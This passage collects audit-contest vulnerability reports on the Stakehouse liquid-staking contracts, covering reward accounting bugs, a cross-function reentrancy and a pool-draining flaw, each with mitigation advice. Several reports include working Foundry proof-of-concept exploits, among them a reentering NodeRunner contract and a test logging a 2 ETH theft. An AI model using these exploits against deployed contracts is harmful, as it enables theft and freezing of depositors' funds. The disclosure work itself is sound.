+ +        // User one has received all the rewards and has no more previewed rewards. +        assertEq(feesAndMevUserOne.balance, 2 ether); +        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 2 ether); +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserOne, +                new address[](0), +                new LPToken[][](0)), +                0); + +        // Check the claimed[] value for user 1. It is correct. +        assertEq( +            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())), +            2 ether); + +        // User one transfers half their giant tokens to user 2. +        vm.startPrank(feesAndMevUserOne); +        giantFeesAndMevPool.lpTokenETH().transfer(feesAndMevUserTwo, 4 ether); +        vm.stopPrank(); + +        // After the tokens have been transferred to user 2, user 1's claimed[] remains +        // unchanged - and is higher than the accumulated payout per share for user 1's +        // current number of shares. +        assertEq( +            giantFeesAndMevPool.claimed(feesAndMevUserOne, address(giantFeesAndMevPool.lpTokenETH())), +            2 ether); + +        // With this incorrect value of claimed[] causing a subtraction underflow, user one +        // cannot preview accumulated eth or perform any action that attempts to claim their +        // rewards such as transferring their tokens. +        vm.startPrank(feesAndMevUserOne); +        vm.expectRevert(); +        giantFeesAndMevPool.previewAccumulatedETH( +            feesAndMevUserOne, +            new address[](0), +            new LPToken[][](0)); + +        console.log("the revert expected now"); +        GiantLP token = giantFeesAndMevPool.lpTokenETH(); +        vm.expectRevert(); +        token.transfer(feesAndMevUserTwo, 1 ether); +        vm.stopPrank(); + +        // Add 1 eth rewards to manager2's staking funds vault. +        vm.deal(address(manager2.stakingFundsVault()), 2 ether); + +        // User 2 claims rewards into the giant pool and obtains its 1/2 share. +        vm.startPrank(feesAndMevUserTwo); +        giantFeesAndMevPool.claimRewards( +            feesAndMevUserTwo, +            getAddressArrayFromValues(address(manager2.stakingFundsVault())), +            blsPubKeyTwoInput); +        vm.stopPrank(); +        assertEq(feesAndMevUserTwo.balance, 1 ether); + +        // At this point, user 1 ought to have accumulated 1 ether from the rewards, +        // however accumulated eth is listed as 0. +        // The reason is that when the giant pool tokens were transferred to +        // user two, the claimed[] value for user one was left unchanged. +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserOne, +                new address[](0), +                new LPToken[][](0)), +                0); + +        // The pool has received 4 eth rewards and paid out 3, but no users +        // are listed as having accumulated the eth. It is orphaned. +        assertEq(giantFeesAndMevPool.totalRewardsReceived(), 4 ether); +        assertEq(giantFeesAndMevPool.totalClaimed(), 3 ether); + +        assertEq( +            giantFeesAndMevPool.previewAccumulatedETH( +                feesAndMevUserTwo, +                new address[](0), +                new LPToken[][](0)), +                0); + +    } +  } \ No newline at end of file  ``` ## Tools Used  ## Recommended Mitigation Steps Reduce claimed[] when necessary on the from side when GiantMevAndFeesPool tokens are transferred. Alternatively, claimed[] could be calculated on a per share basis rather than a total basis in order to simplify some of the adjustments that must be made in the code for claimed[].
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524   # Vulnerability details  ## Impact  * Permanent freeze of funds - users who deposited ETH for staking will not be able to receive their funds, rewards or rotate to another token. The protocol becomes insolvent, it cannot pay anything to the users. * Protocol's LifecycleStatus state machine is broken   Other impacts: * Users deposit funds to an unstakable validator (node runner has already took out his funds)  Impact is also on the Giant Pools that give liquidity to the vaults.  A competitor or malicious actor can cause bad PR for the protocol by causing permanent freeze of user funds at LSD stakehouse. ## Proof of Concept  There are two main bugs that cause the above impact: 1. Reentrancy bug in `withdrawETHForKnot` function in `LiquidStakingManager.sol` 2. Improper balance check in `LiquidStakingManager.sol` for deposited node runner funds.   For easier reading and understanding, please follow the bellow full attack flow diagram when reading through the explanation. ``` ┌───────────┐               ┌───────────┐            ┌───────────┐              ┌───────────┐ │           │               │           │            │           │              │           │ │Node Runner│               │LSD Manager│            │   Vaults  │              │   Users   │ │           │               │           │            │           │              │           │ └─────┬─────┘               └─────┬─────┘            └─────┬─────┘              └─────┬─────┘       │                           │                        │                          │       │   Register BLS Key #1     │                        │                          │       ├──────────────────────────►│                        │                          │       │                           │                        │                          │       │   Register BLS Key #1     │                        │                          │       ├──────────────────────────►│                        │Deposit 24 ETH to savETH  │       │                           │                        │◄─────────────────────────┤       │                           │                        │                          │       │                           │                        │Deposit 4 ETH to mevAndFees       │                           │                        │◄─────────────────────────┐       │WithdrawETHForKnot BLS #1  │                        │                          │       ├──────────────────────────►│                        │                          │       │       Send 4 ETH          │                        │                          │       │◄──────────────────────────┤                        │                          │       │ Reenter stake function    │                        │                          │       ├──────────────────────────►│Get 28 ETH from vaults  │                          │       │                           ├───────────────────────►│                          │       │ ┌───────────────────────┐ │     Send 28 ETH        │                          │       │ │ Stake complete.       │ │◄───────────────────────┤                          │       │ │status=DEPOSIT_COMPLETE│ │                        │                          │       │ └───────────────────────┘ │                        │                          │       │Finished WithdrawETHForKnot│                        │                          │       │◄──────────────────────────┤                        │Users cannot mint derivati│es       │                           │                        │◄─────────────────────────┤       │    ┌──────────────────┐   │                        │Users cannot burnLPTokens │       │    │BLS Key #1 banned │   │                        │◄─────────────────────────┤       │    └──────────────────┘   │                        │Users cannot rotateTokens │       │                           │                        │◄─────────────────────────┤       │                           │                        │                          │ ```  Lets assume the following starting point: 1. Node runner registered and paid 4 ETH for BLS KEY #1 2. Node runner registered and paid 4 ETH for BLS KEY #2 3. savETH users collected 24 ETH ready for staking 4. mevAndFess users collected 4 ETH ready for staking   **Reentrancy in `withdrawETHForKnot`**:  `withdrawETHForKnot` is a function used in `LiquidStakingManager`. It is used to refund a node runner if funds are not yet staked and BAN the BLS key.  `withdrawETHForKnot`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L326 ```     function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external { ....         IOwnableSmartWallet(associatedSmartWallet).rawExecute(             _recipient,             "",             4 ether         ); ....         bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;     } ```  The associatedSmartWallet will send the node runner 4 ETH (out of 8 currently in balance).   Please note: 1.  The Node Runner can reenter the `LiquidStakingManager` when receiving the 4 ETH 2. `bannedBLSPublicKeys[_blsPublicKeyOfKnot] = associatedSmartWallet;` is only executed after the reentrancy  We can call any method we need with the following states: * BLS key is NOT banned * Status is `IDataStructures.LifecycleStatus.INITIALS_REGISTERED`  The node runner will call the `stake` function to stake the deposited funds from the vaults and change the status to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  `stake`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L524  ```     function stake(         bytes[] calldata _blsPublicKeyOfKnots,         bytes[] calldata _ciphertexts,         bytes[] calldata _aesEncryptorKeys,         IDataStructures.EIP712Signature[] calldata _encryptionSignatures,         bytes32[] calldata _dataRoots     ) external { ....             // check if BLS public key is registered with liquid staking derivative network and not banned             require(isBLSPublicKeyBanned(blsPubKey) == false, "BLS public key is banned or not a part of LSD network"); ....             require(                 getAccountManager().blsPublicKeyToLifecycleStatus(blsPubKey) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,                 "Initials not registered"             ); ....             _assertEtherIsReadyForValidatorStaking(blsPubKey);              _stake(                 _blsPublicKeyOfKnots[i],                 _ciphertexts[i],                 _aesEncryptorKeys[i],                 _encryptionSignatures[i],                 _dataRoots[i]             ); ....     } ```  The `stake` function checks  1. That the BLS key is not banned. In our case its not yet banned, because the banning happens after the reentrancy 2. IDataStructures.LifecycleStatus.INITIALS_REGISTERED is the current Lifecycle status. Which it is.  3. There is enough balance in the vaults and node runners smart wallet in `_assertEtherIsReadyForValidatorStaking`  `_assertEtherIsReadyForValidatorStaking`  checks that the node runners smart wallet has more than 4 ETH.  Because our node runner has two BLS keys registered, there is an additional 4 ETH on BLS Key #2 and the conditions will pass.   `_assertEtherIsReadyForValidatorStaking` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L934 ```     function _assertEtherIsReadyForValidatorStaking(bytes calldata blsPubKey) internal view {         address associatedSmartWallet = smartWalletOfKnot[blsPubKey];         require(associatedSmartWallet.balance >= 4 ether, "Smart wallet balance must be at least 4 ether");          LPToken stakingFundsLP = stakingFundsVault.lpTokenForKnot(blsPubKey);         require(address(stakingFundsLP) != address(0), "No funds staked in staking funds vault");         require(stakingFundsLP.totalSupply() == 4 ether, "DAO staking funds vault balance must be at least 4 ether");          LPToken savETHVaultLP = savETHVault.lpTokenForKnot(blsPubKey);         require(address(savETHVaultLP) != address(0), "No funds staked in savETH vault");         require(savETHVaultLP.totalSupply() == 24 ether, "KNOT must have 24 ETH in savETH vault");     } ```  Since we can pass all checks. `_stake` will be called which withdraws all needed funds from the vault and executes a call through the smart wallet to the `TransactionRouter` with 32 ETH needed for the stake. The `TransactionRouter` will process the funds and stake them. The `LifecycleStatus` will be updated to `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  `_stake`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L739 ```     function _stake(         bytes calldata _blsPublicKey,         bytes calldata _cipherText,         bytes calldata _aesEncryptorKey,         IDataStructures.EIP712Signature calldata _encryptionSignature,         bytes32 dataRoot     ) internal {         address smartWallet = smartWalletOfKnot[_blsPublicKey];          // send 24 ether from savETH vault to smart wallet         savETHVault.withdrawETHForStaking(smartWallet, 24 ether);          // send 4 ether from DAO staking funds vault         stakingFundsVault.withdrawETH(smartWallet, 4 ether);          // interact with transaction router using smart wallet to deposit 32 ETH         IOwnableSmartWallet(smartWallet).execute(             address(getTransactionRouter()),             abi.encodeWithSelector(                 ITransactionRouter.registerValidator.selector,                 smartWallet,                 _blsPublicKey,                 _cipherText,                 _aesEncryptorKey,                 _encryptionSignature,                 dataRoot             ),             32 ether         ); ....     } ```  After `_stake` and `stake` will finish executing we will finish the Cross-Function Reentrancy.   The protocol has entered the following state for the BLS key #1: 1. BLS Key #1 is banned 2. LifecycleStatus is `IDataStructures.LifecycleStatus.DEPOSIT_COMPLETE`  In such a state where the key is banned, no one can mint derivatives and therefor depositors cannot withdraw rewards/dETH:  `mintDerivatives`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/LiquidStakingManager.sol#L577 ```     function mintDerivatives(         bytes[] calldata _blsPublicKeyOfKnots,         IDataStructures.ETH2DataReport[] calldata _beaconChainBalanceReports,         IDataStructures.EIP712Signature[] calldata _reportSignatures     ) external { ....             // check if BLS public key is registered and not banned             require(isBLSPublicKeyBanned(_blsPublicKeyOfKnots[i]) == false, "BLS public key is banned or not a part of LSD network"); .... ```  Vault LP Tokens cannot be burned for withdraws because that is not supported in DEPOSIT_COMPLETE state:  `burnLPToken`: https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SavETHVault.sol#L126 ```     function burnLPToken(LPToken _lpToken, uint256 _amount) public nonReentrant returns (uint256) { ...         bytes memory blsPublicKeyOfKnot = KnotAssociatedWithLPToken[_lpToken];         IDataStructures.LifecycleStatus validatorStatus = getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfKnot);          require(             validatorStatus == IDataStructures.LifecycleStatus.INITIALS_REGISTERED ||             validatorStatus == IDataStructures.LifecycleStatus.TOKENS_MINTED,             "Cannot burn LP tokens"         ); .... ```  Tokens cannot be rotated to other LP tokens because that is not supported in a DEPOSIT_COMPLETE state   `rotateLPTokens` ```     function rotateLPTokens(LPToken _oldLPToken, LPToken _newLPToken, uint256 _amount) public { ...         bytes memory blsPublicKeyOfPreviousKnot = KnotAssociatedWithLPToken[_oldLPToken]; ...         require(             getAccountManager().blsPublicKeyToLifecycleStatus(blsPublicKeyOfPreviousKnot) == IDataStructures.LifecycleStatus.INITIALS_REGISTERED,             "Lifecycle status must be one"         ); ... ```  Funds are stuck, they cannot be taken or used.  The LifecycleStatus is also stuck, tokens cannot be minted.   ### Foundry POC:  The POC will showcase the scenario in the diagram.  Add the following contracts to `liquid-staking` folder: https://github.com/coade-423n4/2022-11-stakehouse/tree/main/contracts/testing/liquid-staking ``` // SPDX-License-Identifier: MIT  pragma solidity 0.8.13;  import { LiquidStakingManager } from "../../liquid-staking/LiquidStakingManager.sol"; import { TestUtils } from "../../../test/utils/TestUtils.sol";  contract NodeRunner {     bytes blsPublicKey1;     LiquidStakingManager manager;     TestUtils testUtils;      constructor(LiquidStakingManager _manager, bytes memory _blsPublicKey1, bytes memory _blsPublicKey2, address _testUtils) payable public {         manager = _manager;         blsPublicKey1 = _blsPublicKey1;         testUtils = TestUtils(_testUtils);         //register BLS Key #1         manager.registerBLSPublicKeys{ value: 4 ether }(             testUtils.getBytesArrayFromBytes(blsPublicKey1),             testUtils.getBytesArrayFromBytes(blsPublicKey1),             address(0xdeadbeef)         );         // Register BLS Key #2         manager.registerBLSPublicKeys{ value: 4 ether }(             testUtils.getBytesArrayFromBytes(_blsPublicKey2),             testUtils.getBytesArrayFromBytes(_blsPublicKey2),             address(0xdeadbeef)         );     }     receive() external payable {         testUtils.stakeSingleBlsPubKey(blsPublicKey1);     } } ```  Add the following imports to `LiquidStakingManager.t.sol` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L12 ``` import { NodeRunner } from "../../contracts/testing/liquid-staking/NodeRunner.sol"; import { IDataStructures } from "@blockswaplab/stakehouse-contract-interfaces/contracts/interfaces/IDataStructures.sol"; ```  Add the following test to `LiquidStakingManager.t.sol` https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/test/foundry/LiquidStakingManager.t.sol#L121 ```     function testLockStakersFunds() public {         uint256 startAmount = 8 ether;         // Create NodeRunner. Constructor registers two BLS Keys         address nodeRunner = address(new NodeRunner{value: startAmount}(manager, blsPubKeyOne, blsPubKeyTwo, address(this)));                  // Simulate state transitions in lifecycle status to initials registered (value of 1)         MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 1);          // savETHUser, feesAndMevUser funds used to deposit into validator BLS key #1         address feesAndMevUser = accountTwo; vm.deal(feesAndMevUser, 4 ether);         address savETHUser = accountThree; vm.deal(savETHUser, 24 ether);                  // deposit savETHUser, feesAndMevUser funds for validator #1         depositIntoDefaultSavETHVault(savETHUser, blsPubKeyOne, 24 ether);         depositIntoDefaultStakingFundsVault(feesAndMevUser, blsPubKeyOne, 4 ether);          // withdraw ETH for first BLS key and reenter         // This will perform a cross-function reentracy to call stake         vm.startPrank(nodeRunner);         manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);         // Simulate state transitions in lifecycle status to ETH deposited (value of 2)         // In real deployment, when stake is called TransactionRouter.registerValidator is called to change the state to DEPOSIT_COMPLETE          MockAccountManager(factory.accountMan()).setLifecycleStatus(blsPubKeyOne, 2);         vm.stopPrank();                  // Validate mintDerivatives reverts because of banned public key          (,IDataStructures.ETH2DataReport[] memory reports) = getFakeBalanceReport();         (,IDataStructures.EIP712Signature[] memory sigs) = getFakeEIP712Signature();         vm.expectRevert("BLS public key is banned or not a part of LSD network");         manager.mintDerivatives(             getBytesArrayFromBytes(blsPubKeyOne),             reports,             sigs         );          // Validate depositor cannot burn LP tokens         vm.startPrank(savETHUser);         vm.expectRevert("Cannot burn LP tokens");         savETHVault.burnLPTokensByBLS(getBytesArrayFromBytes(blsPubKeyOne), getUint256ArrayFromValues(24 ether));         vm.stopPrank();     }  ```  To run the POC execute: `yarn test -m testLockStakersFunds -v `  Expected output: ``` Running 1 test for test/foundry/LiquidStakingManager.t.sol:LiquidStakingManagerTests [PASS] testLockStakersFunds() (gas: 1731537) Test result: ok. 1 passed; 0 failed; finished in 8.21ms ```  To see the full trace, execute: `yarn test -m testLockStakersFunds -vvvv` ## Tools Used  VS Code, Foundry  ## Recommended Mitigation Steps  1. Add a reentrancy guard to `withdrawETHForKnot` and `stake` 2. Keep proper accounting for ETH deposited by node runner for each BLS key 
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L126-L138 https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/GiantMevAndFeesPool.sol#L176-L178   # Vulnerability details  ## Impact The contract GiantMevAndFeesPool override the function totalRewardsReceived: ``` return address(this).balance + totalClaimed - idleETH; ``` The function totalRewardsReceived is used as the current rewards balance to caculate the unprocessed rewards in the function `SyndicateRewardsProcessor._updateAccumulatedETHPerLP` ``` uint256 received = totalRewardsReceived(); uint256 unprocessed = received - totalETHSeen; ```  The idleETH will be decreased in the function `batchDepositETHForStaking` for sending eth to the staking pool. But the idleETH wont be increased in the function `bringUnusedETHBackIntoGiantPool` which is used to burn lp tokens in the staking pool, and the staking pool will send the eth back to the giant pool. And then because of the diminution of the idleETH, the `accumulatedETHPerLPShare` is added out of thin air. So the attacker can steal more eth from the GiantMevAndFeesPool.  ## Proof of Concept test: test/foundry/TakeFromGiantPools.t.sol ``` pragma solidity ^0.8.13;  // SPDX-License-Identifier: MIT  import "forge-std/console.sol"; import {GiantPoolTests} from "./GiantPools.t.sol"; import { LPToken } from "../../contracts/liquid-staking/LPToken.sol";  contract TakeFromGiantPools is GiantPoolTests {     function testDWclaimRewards() public{         address nodeRunner = accountOne; vm.deal(nodeRunner, 12 ether);         address feesAndMevUserOne = accountTwo; vm.deal(feesAndMevUserOne, 4 ether);         address feesAndMevUserTwo = accountThree; vm.deal(feesAndMevUserTwo, 4 ether);          // Register BLS key         registerSingleBLSPubKey(nodeRunner, blsPubKeyOne, accountFour);          // Deposit ETH into giant fees and mev         vm.startPrank(feesAndMevUserOne);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);         vm.stopPrank();         vm.startPrank(feesAndMevUserTwo);         giantFeesAndMevPool.depositETH{value: 4 ether}(4 ether);          bytes[][] memory blsKeysForVaults = new bytes[][](1);         blsKeysForVaults[0] = getBytesArrayFromBytes(blsPubKeyOne);          uint256[][] memory stakeAmountsForVaults = new uint256[][](1);         stakeAmountsForVaults[0] = getUint256ArrayFromValues(4 ether);         giantFeesAndMevPool.batchDepositETHForStaking(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             getUint256ArrayFromValues(4 ether),             blsKeysForVaults,             stakeAmountsForVaults         );         vm.warp(block.timestamp+31 minutes);         LPToken[] memory tokens = new LPToken[](1);         tokens[0] = manager.stakingFundsVault().lpTokenForKnot(blsPubKeyOne);          LPToken[][] memory allTokens = new LPToken[][](1);         allTokens[0] = tokens;         giantFeesAndMevPool.bringUnusedETHBackIntoGiantPool(             getAddressArrayFromValues(address(manager.stakingFundsVault())),             allTokens,             stakeAmountsForVaults         );         // inject a NOOP to skip some functions         address[] memory stakingFundsVaults = new address[](1);         bytes memory code = new bytes(1);         code[0] = 0x00;         vm.etch(address(0x123), code);         stakingFundsVaults[0] = address(0x123);         giantFeesAndMevPool.claimRewards(feesAndMevUserTwo, stakingFundsVaults, blsKeysForVaults);         vm.stopPrank();         console.log("user one:", getBalance(feesAndMevUserOne));         console.log("user two(attacker):", getBalance(feesAndMevUserTwo));         console.log("giantFeesAndMevPool:", getBalance(address(giantFeesAndMevPool)));     }      function getBalance(address addr) internal returns (uint){         // giant LP : eth at ratio of 1:1         return addr.balance + giantFeesAndMevPool.lpTokenETH().balanceOf(addr);     }  } ```  run test: ``` forge test --match-test testDWclaimRewards -vvv ```  test log: ``` Logs:   user one: 4000000000000000000   user two(attacker): 6000000000000000000   giantFeesAndMevPool: 6000000000000000000 ``` The attacker stole 2 eth from the pool.  ## Tools Used fodunry  ## Recommended Mitigation Steps Add  ``` idleETH += _amounts[i]; ``` before burnLPTokensForETH in the GiantMevAndFeesPool.bringUnusedETHBackIntoGiantPool function.
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91   # Vulnerability details  ## Impact The `GiantMevAndFeesPool.previewAccumulatedETH` function ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L82)) allows to view the ETH that is accumulated by an address.    However the formula is not correct.    In each iteration of the foor loop, `accumulated` is assigned a new value ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L91)) when actually the value should be updated like this:   ```solidity accumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(         address(this),         _lpTokens[i]     ); ```  Obviously the `accumulated` value must be calculated for all stakingFundVaults not only for one stakingFundsVault.    While this calculation is not used internally by the contract, it will cause any third-party contract that relies on this calculation to behave incorrectly.    For example a third party smart contract might only allow users to withdraw once the value returned by `previewAccumulatedETH` reaches a certain threshold. Because of the issue however the accumulated ETH value that is returned will always be too low.    ## Tools Used VSCode  ## Recommended Mitigation Steps Fix:   ```solidity @@ -88,7 +88,7 @@ contract GiantMevAndFeesPool is ITransferHookProcessor, GiantPoolBase, Syndicate            uint256 accumulated;          for (uint256 i; i < _stakingFundsVaults.length; ++i) { -            accumulated = StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH( +            accumulated += StakingFundsVault(payable(_stakingFundsVaults[i])).batchPreviewAccumulatedETH(                  address(this),                  _lpTokens[i]              ); ```
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22   # Vulnerability details  ## Impact The `GiantSavETHVaultPool` and `GiantMevAndFeesPool` both have a `batchRotateLPTokens` function that allows to move staked ETH to another key.    Both functions require that the GiantLP balance of the sender is `>=0.5 ether`.    [https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantSavETHVaultPool.sol#L127)    [https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L116)    The reason for this is that there is a `common interest` needed in order to rotate LP Tokens.    The way this is implemented right now does not serve this purpose and even makes the functions unable to be called in some cases.    The `MIN_STAKING_AMOUNT` for the GiantPools is `0.001 ether` ([https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22](https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantPoolBase.sol#L22)).    So a user should expect that this amount is sufficient to properly use the contract.    However even if there are multiple users paying into the GiantPool, they might not reach the 0.5 ETH threshold to call the function.    So even if they would use some kind of multisig wallet to call the `batchRotateLPTokens` function, it would not be possible.    Also the threshold does not scale.    Imagine that User A puts 100 ETH into the GiantPool. Another User B puts 0.5 ETH into the GiantPool.    Can we speak of "common interest" when User B wants to rotate the LP Tokens?    ## Tools Used VSCode  ## Recommended Mitigation Steps My suggestion is to use a formula like:   `require(lpTokenETH.balanceOf(msg.sender) >= (lpTokenETH.totalSupply() / CONSTANT_VALUE))`.   Where you can choose a CONSTANT_VALUE like 20 or 50.    This properly scales the required amount and helps mitigate both scenarios.  
# Lines of code  https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/SyndicateRewardsProcessor.sol#L63 https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L88   # Vulnerability details  ## Impact The SyndicateRewardsProcessor's internal `_distributeETHRewardsToUserForToken()` function is called from external `claimRewards()` function in the `StakingFundsVault` contract. This function is called by LP Token holders to claim their accumulated rewards based on their LP Token holdings and already claimed rewards. The accumulated rewards `due` are calculated as `((accumulatedETHPerLPShare * balance) / PRECISION)` reduced by the previous claimed amount stored in `claimed[_user][_token]`. When the ETH is sent to the `_user` the stored value should be increased by the `due` amount. However in the current code base the `claimed[_user][_token]` is set equal to the calculated `due`.  ```solidity function _distributeETHRewardsToUserForToken(         address _user,         address _token,         uint256 _balance,         address _recipient     ) internal {         require(_recipient != address(0), "Zero address");         uint256 balance = _balance;         if (balance > 0) {             // Calculate how much ETH rewards the address is owed / due              uint256 due = ((accumulatedETHPerLPShare * balance) / PRECISION) - claimed[_user][_token];             if (due > 0) {                 claimed[_user][_token] = due;                 totalClaimed += due;                 (bool success, ) = _recipient.call{value: due}("");     ...    }         }     } ```  This means the first time a user will claim their rewards they will get the correct amount and the correct value will be stored in the `claimed[_user][_token]`.  When extra ETH is recieved from the MEV and fees rewards and the user claims their reward again, the claimed amount will only reflect the last claimed amount. As a result they can then repeatedly claim untill the MEV and Fee vault is almost depleted.  ## Proof of Concept Following modification to the existing `StakingFundsVault.t.sol` will provide a test to demonstrate the issue: ```diff diff --git a/test/foundry/StakingFundsVault.t.sol b/test/foundry/StakingFundsVault.t.sol index 53b4ce0..4db8fc8 100644 --- a/test/foundry/StakingFundsVault.t.sol +++ b/test/foundry/StakingFundsVault.t.sol @@ -4,6 +4,7 @@ import "forge-std/console.sol";    import { StakingFundsVault } from "../../contracts/liquid-staking/StakingFundsVault.sol";  import { LPToken } from "../../contracts/liquid-staking/LPToken.sol"; +import { SyndicateRewardsProcessor} from "../../contracts/liquid-staking/SyndicateRewardsProcessor.sol";  import {      TestUtils,      MockLSDNFactory, @@ -417,4 +418,73 @@ contract StakingFundsVaultTest is TestUtils {          assertEq(vault.totalClaimed(), rewardsAmount);          assertEq(vault.totalRewardsReceived(), rewardsAmount);      } + +    function testRepetitiveClaim() public { +        // register BLS key with the network +        registerSingleBLSPubKey(accountTwo, blsPubKeyFour, accountFive); + +        vm.label(accountOne, "accountOne"); +        vm.label(accountTwo, "accountTwo"); +        // Do a deposit of 4 ETH for bls pub key four in the fees and mev pool +        depositETH(accountTwo, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour)); +        depositETH(accountOne, maxStakingAmountPerValidator / 2, getUint256ArrayFromValues(maxStakingAmountPerValidator / 2), getBytesArrayFromBytes(blsPubKeyFour)); + +        // Do a deposit of 24 ETH for savETH pool +        liquidStakingManager.savETHVault().depositETHForStaking{value: 24 ether}(blsPubKeyFour, 24 ether); + +        stakeAndMintDerivativesSingleKey(blsPubKeyFour); + +        LPToken lpTokenBLSPubKeyFour = vault.lpTokenForKnot(blsPubKeyFour); + +        vm.warp(block.timestamp + 3 hours); + +        // Deal ETH to the staking funds vault +        uint256 rewardsAmount = 1.2 ether; +        console.log("depositing %s wei into the vault.\n", rewardsAmount); +        vm.deal(address(vault), rewardsAmount); +        assertEq(address(vault).balance, rewardsAmount); +        assertEq(vault.previewAccumulatedETH(accountOne, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2); +        assertEq(vault.previewAccumulatedETH(accountTwo, vault.lpTokenForKnot(blsPubKeyFour)), rewardsAmount / 2); + +        logAccounts(); + +        console.log("Claiming rewards for accountOne.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        console.log("depositing %s wei into the vault.\n", rewardsAmount); +        vm.deal(address(vault), address(vault).balance + rewardsAmount); +        vm.warp(block.timestamp + 3 hours); +        logAccounts(); + +        console.log("Claiming rewards for accountOne.\n"); +        vm.prank(accountOne); +        vault.claimRewards(accountOne, getBytesArrayFromBytes(blsPubKeyFour)); +        logAccounts(); + +        